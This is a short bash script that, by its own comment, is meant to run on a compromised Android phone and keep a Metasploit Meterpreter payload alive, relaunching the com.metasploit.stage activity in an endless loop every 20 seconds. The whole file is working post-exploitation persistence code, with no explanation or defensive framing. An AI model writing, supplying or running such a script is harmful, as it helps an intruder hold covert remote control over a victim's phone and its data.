#!/bin/bash

# Shell script to runonce on a compromised android phone to ensure persistent Meterpreter payload execution

while :
do am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity
sleep 20
done